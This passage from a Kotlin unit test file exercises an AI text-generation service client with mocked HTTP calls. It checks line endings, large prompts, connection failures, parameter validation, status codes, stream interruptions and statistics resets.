            val mockResponse = mockHttpResponse(200, "Locale response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            localeTests.forEach { text ->
                val result = auraAIService.generateResponse(text)
                assertEquals("Locale response", result)
            }
        }

        @Test
        @DisplayName("Should handle platform-specific line endings")
        fun shouldHandlePlatformSpecificLineEndings() = runTest {
            val lineEndingTests = listOf(
                "Unix line ending\n",
                "Windows line ending\r\n",
                "Mac line ending\r",
                "Mixed\nline\r\nendings\r"
            )

            val mockResponse = mockHttpResponse(200, "Line ending response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            lineEndingTests.forEach { text ->
                val result = auraAIService.generateResponse(text)
                assertEquals("Line ending response", result)
            }
        }
    }

    @Nested
    @DisplayName("Memory and Resource Management Tests")
    inner class MemoryAndResourceManagementTests {
        @Test
        @DisplayName("Should handle memory pressure scenarios")
        fun shouldHandleMemoryPressureScenarios() = runTest {
            // Simulate memory pressure by creating large objects
            val largePrompts = (1..100).map { i ->
                "Large prompt $i: " + "x".repeat(10000)
            }

            val mockResponse = mockHttpResponse(200, "Memory test response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            largePrompts.forEach { prompt ->
                val result = auraAIService.generateResponse(prompt)
                assertEquals("Memory test response", result)
            }
        }

        @Test
        @DisplayName("Should handle resource cleanup in failure scenarios")
        fun shouldHandleResourceCleanupInFailureScenarios() = runTest {
            // Test cleanup when operations fail
            whenever(mockHttpClient.post(any())).thenThrow(IOException("Connection failed"))

            repeat(10) {
                assertThrows<IOException> {
                    auraAIService.generateResponse("Test $it")
                }
            }

            // Verify service can still perform other operations
            auraAIService.clearCache()
            auraAIService.resetStatistics()
            val stats = auraAIService.getServiceStatistics()
            assertNotNull(stats)
        }

        @Test
        @DisplayName("Should handle connection pool exhaustion")
        fun shouldHandleConnectionPoolExhaustion() = runTest {
            // Simulate connection pool exhaustion
            whenever(mockHttpClient.post(any())).thenThrow(IOException("Connection pool exhausted"))

            assertThrows<IOException> {
                auraAIService.generateResponse("Pool test")
            }

            // Should still be able to perform non-network operations
            auraAIService.updateApiKey("new-key")
            auraAIService.clearCache()
            val stats = auraAIService.getServiceStatistics()
            assertNotNull(stats)
        }
    }

    @Nested
    @DisplayName("API Contract and Specification Tests")
    inner class ApiContractAndSpecificationTests {
        @Test
        @DisplayName("Should enforce method parameter contracts")
        fun shouldEnforceMethodParameterContracts() = runTest {
            // Test all parameter validation
            assertThrows<IllegalArgumentException> { auraAIService.generateResponse("") }
            assertThrows<IllegalArgumentException> { auraAIService.generateStreamingResponse("") }
            assertThrows<IllegalArgumentException> { auraAIService.updateApiKey("") }
            assertThrows<IllegalArgumentException> { auraAIService.updateBaseUrl("") }
            assertThrows<IllegalArgumentException> { auraAIService.updateTimeout(0) }
            assertThrows<IllegalArgumentException> { auraAIService.updateTimeout(-1) }
        }

        @Test
        @DisplayName("Should return consistent response types")
        fun shouldReturnConsistentResponseTypes() = runTest {
            val mockResponse = mockHttpResponse(200, "Test response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "Health OK"))

            // Test return types
            val stringResponse: String = auraAIService.generateResponse("Test")
            val batchResponse: List<String> = auraAIService.generateBatchResponses(listOf("Test"))
            val healthResponse: HealthCheckResult = auraAIService.healthCheck()
            val statsResponse: Map<String, Any> = auraAIService.getServiceStatistics()

            assertTrue(stringResponse is String)
            assertTrue(batchResponse is List<*>)
            assertTrue(healthResponse is HealthCheckResult)
            assertTrue(statsResponse is Map<*, *>)
        }

        @Test
        @DisplayName("Should handle method call ordering requirements")
        fun shouldHandleMethodCallOrderingRequirements() = runTest {
            // Test that methods can be called in any order
            auraAIService.clearCache()
            auraAIService.updateApiKey("key1")
            auraAIService.resetStatistics()
            auraAIService.updateBaseUrl("https://test1.com")
            auraAIService.expireCache()
            auraAIService.updateTimeout(1000L)
            
            val mockResponse = mockHttpResponse(200, "Ordered response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "Health OK"))
            
            val result = auraAIService.generateResponse("Test ordering")
            val health = auraAIService.healthCheck()
            val stats = auraAIService.getServiceStatistics()
            
            assertEquals("Ordered response", result)
            assertTrue(health.isHealthy)
            assertNotNull(stats)
        }
    }

    @Nested
    @DisplayName("Regression and Edge Case Tests")
    inner class RegressionAndEdgeCaseTests {
        @Test
        @DisplayName("Should handle duplicate line bug from original test")
        fun shouldHandleDuplicateLineBugFromOriginalTest() = runTest {
            // This test addresses the duplicate line at line 582 in the original test
            val mockHttpResponse = mockHttpResponse(404, "Not Found")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            
            verify(mockLogger).error("HTTP error response: 404 - Not Found")
        }

        @Test
        @DisplayName("Should handle all HTTP status code ranges")
        fun shouldHandleAllHttpStatusCodeRanges() = runTest {
            val statusCodes = listOf(
                // 1xx Informational
                100, 101, 102,
                // 2xx Success (only 200 should succeed)
                200, 201, 202, 204,
                // 3xx Redirection
                300, 301, 302, 304, 307, 308,
                // 4xx Client Error
                400, 401, 403, 404, 409, 422, 429,
                // 5xx Server Error
                500, 502, 503, 504, 507, 508
            )
            
            statusCodes.forEach { statusCode ->
                val mockResponse = mockHttpResponse(statusCode, "Status $statusCode")
                whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
                
                if (statusCode == 200) {
                    val result = auraAIService.generateResponse("Test")
                    assertEquals("Status $statusCode", result)
                } else {
                    assertThrows<IOException> {
                        auraAIService.generateResponse("Test")
                    }
                    verify(mockLogger).error("HTTP error response: $statusCode - Status $statusCode")
                }
            }
        }

        @Test
        @DisplayName("Should handle stream interruption at different points")
        fun shouldHandleStreamInterruptionAtDifferentPoints() = runTest {
            val testScenarios = listOf(
                // Immediate failure
                flow<String> { throw IOException("Immediate failure") },
                // Failure after first chunk
                flow { emit("chunk1"); throw IOException("After first chunk") },
                // Failure after multiple chunks
                flow { emit("chunk1"); emit("chunk2"); emit("chunk3"); throw IOException("After multiple chunks") },
                // Empty stream that fails
                flow<String> { throw IOException("Empty stream failure") }
            )

            testScenarios.forEach { scenario ->
                whenever(mockHttpClient.postStream(any())).thenReturn(scenario)
                
                assertThrows<IOException> {
                    auraAIService.generateStreamingResponse("Test stream").collect()
                }
            }
        }

        @Test
        @DisplayName("Should handle statistical edge cases")
        fun shouldHandleStatisticalEdgeCases() {
            // Test statistics consistency
            val stats1 = auraAIService.getServiceStatistics()
            val stats2 = auraAIService.getServiceStatistics()
            
            assertEquals(stats1, stats2)
            
            // Test reset behavior
            auraAIService.resetStatistics()
            val statsAfterReset = auraAIService.getServiceStatistics()
            
            // Should still return the same structure
            assertEquals(stats1.keys, statsAfterReset.keys)
            
            // Test multiple resets
            repeat(10) {
                auraAIService.resetStatistics()
            }
            
            val finalStats = auraAIService.getServiceStatistics()
            assertEquals(stats1.keys, finalStats.keys)
        }
    }
}